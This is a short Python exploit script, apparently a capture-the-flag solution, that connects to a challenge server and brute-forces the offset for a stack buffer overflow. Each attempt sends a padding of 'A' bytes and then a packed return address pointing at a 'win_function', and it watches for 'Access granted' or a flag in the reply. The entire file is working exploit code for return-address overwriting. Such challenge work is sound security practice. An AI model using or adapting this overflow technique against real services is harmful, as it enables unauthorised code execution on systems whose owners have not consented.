
import socket
import sys
import time
import struct

HOST = 'pods.shibirsec.qzz.io'
PORT = 36106
WIN_ADDR = 0x08049264 # win_function

def try_offset(offset):
    print(f"[*] Testing offset: {offset}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    try:
        s.connect((HOST, PORT))
        s.recv(1024) # Banner

        payload = b"A" * offset
        payload += struct.pack("<I", WIN_ADDR)
        payload += b"\n"

        s.sendall(payload)

        # Check response
        response = s.recv(4096)
        if b"Access granted" in response or b"Flag:" in response:
            print(f"[+] SUCCESS! Offset {offset} worked!")
            print(response.decode(errors='replace'))
            return True
        else:
            # print(f"[-] Response: {response.decode(errors='replace').strip()}")
            pass
            
    except Exception as e:
        pass
        # print(f"[-] Error: {e}")
    finally:
        s.close()
    return False

if __name__ == "__main__":
    # Try offsets around 76 (72, 76, 80, etc)
    for off in range(60, 120, 4):
        if try_offset(off):
            break
